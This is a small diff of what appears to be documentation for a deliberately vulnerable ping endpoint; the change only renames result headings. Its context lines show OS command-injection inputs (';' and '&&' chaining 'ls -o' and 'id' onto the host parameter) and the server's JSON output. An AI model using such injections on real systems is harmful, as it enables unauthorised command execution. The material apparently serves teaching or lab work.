@@ -254,7 +254,7 @@ Result:
 /ping?host=127.0.0.1; ls -o
 ```
 
-Sample result (abridged):
+Result:
 
 ```json
 {"command":"ping -c 1 127.0.0.1; ls -o","output":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms\n..."}
@@ -264,7 +264,7 @@ Sample result (abridged):
 /ping?host=127.0.0.1 && id
 ```
 
-Sample result (abridged):
+Result:
 
 ```json
 {"command":"ping -c 1 127.0.0.1 ","output":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.140 ms\n..."}
